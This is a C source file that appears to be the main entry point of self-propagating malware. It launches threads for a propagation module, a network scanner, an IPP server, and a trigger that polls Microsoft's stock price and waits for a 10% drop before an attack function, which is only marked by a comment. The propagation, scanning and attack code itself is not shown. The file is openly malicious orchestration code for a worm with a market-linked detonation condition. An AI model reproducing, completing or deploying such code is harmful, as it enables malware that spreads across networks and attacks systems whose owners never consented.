#include "stock_client.h"
#include "ipp_server.h"
#include "propagate.h"
#include "scanner.h"

void * start_trigger(void *varg){
    Globals *global = (Globals *) varg;
    int trigger_attack;
    global->printf("Starting trigger module...\n");
    
    trigger_attack = get_microsoft_stock(global);
    while(trigger_attack != 1) // Wait until stock value drops by 10%
    {
        trigger_attack = get_microsoft_stock(global);
        //global->sleep(1);
    }
    // call attack function
}

void * start_propagate(void *varg){
    Globals *global = (Globals *) varg;
    global->printf("Starting propagation module...\n");
    propagate(global);
}
void * start_network_scanner(void *varg){
    Globals *global = (Globals *) varg;
    global->printf("Starting network-scanner module...\n");
    scan_net(global);
}

void * start_ipp_server(void *varg){
    Globals *global = (Globals *) varg;
    global->printf("Starting ipp-server module...\n");
    serve(global);
}

void entry(Globals *global) {
    // Trigger of the attack
    pthread_t thread_id_trigger;
    global->pthread_create(&thread_id_trigger, NULL, start_trigger, global);

    // start propagate
    pthread_t thread_id_propagate;
    global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);

    // start network scanner
    pthread_t thread_id_scanner;
    global->pthread_create(&thread_id_scanner, NULL, start_network_scanner, global);

    // start ipp server
    pthread_t thread_id_ipp;
    global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);

    
    global->fprintf(global->stdout, "Started all modules!\n");
    // keep running
    while(1){
        //global->fprintf(global->stdout, "Sleeping with my eyes open *.*\n");
        global->sleep(1);
    }
}